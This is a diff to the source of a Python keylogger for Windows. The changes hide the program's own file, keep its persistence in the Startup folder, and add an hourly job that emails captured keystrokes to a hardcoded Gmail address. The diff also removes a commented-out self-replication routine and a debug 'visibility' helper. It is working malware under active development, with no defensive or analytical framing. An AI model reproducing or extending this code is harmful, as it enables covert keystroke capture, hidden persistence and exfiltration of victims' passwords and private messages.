@@ -9,7 +9,7 @@ try:
     import email.mime.application
     from email.mime.multipart import MIMEMultipart
     from pynput.keyboard import Key, Listener
-    import os,   sys, time, uuid
+    import os, stat, sys, time, uuid
 except ModuleNotFoundError:
     from subprocess import call
     packets = ["pynput", "smtplib", "email", "schedule", "win32con", "win32api"]
@@ -65,7 +65,6 @@ finally:
             os.system(
                 f'copy "{keylogger}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
         win32api.SetFileAttributes(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{keylogger_name}", win32con.FILE_ATTRIBUTE_HIDDEN)
-    # подумай над shedule каждый час отправлять данные
 
     with keyboard.Listener(
             on_press=on_press,
@@ -76,33 +75,14 @@ finally:
         on_release=on_release)
     listener.start()
 
-    # with open(sys.argv[0]) as file:
-    #     self_content = file.read()
-    #     # while True:
-    #     for i in range(1):
-    #         # wait 3 seconds
-    #         time.sleep(3)
-    #
-    #         # create unique filename
-    #         dupe = "%s.py" % uuid.uuid4()
-    #
-    #         # open and write to the copy
-    #         copy = open(dupe, "w")
-    #         copy.write(self_content)
-    #         copy.close()
-    #
-    #         # make the copy executable and execute
-    #         # os.chmod(dupe, "0777"))
-    #         os.system("./%s &" % dupe) #доделать расспространение
+    def sendData():
+        server.sendmail('cnxnd11@gmail.com', ['cnxnd11@gmail.com'], msg.as_string())
+        server.quit()
 
     def invisibility():
-        win32api.SetFileAttributes(sys.argv[0], win32con.FILE_ATTRIBUTE_HIDDEN)#поиграйся с атрибутами потому что при хиден не хочет копироваться в атозагрузку
+        win32api.SetFileAttributes(sys.argv[0], win32con.FILE_ATTRIBUTE_HIDDEN)
 
-    def visibility(): # DELETE BEFORE PUSHING
-        win32api.SetFileAttributes(sys.argv[0], win32con.FILE_ATTRIBUTE_NORMAL)
     if __name__ == '__main__':
-          startup()
-        # invisibility()
-        # visibility()
-        # server.sendmail('cnxnd11@gmail.com', ['cnxnd11@gmail.com'], msg.as_string())
-        # server.quit()
+        startup()
+        invisibility()
+        schedule.every(1).hour.do(sendData)
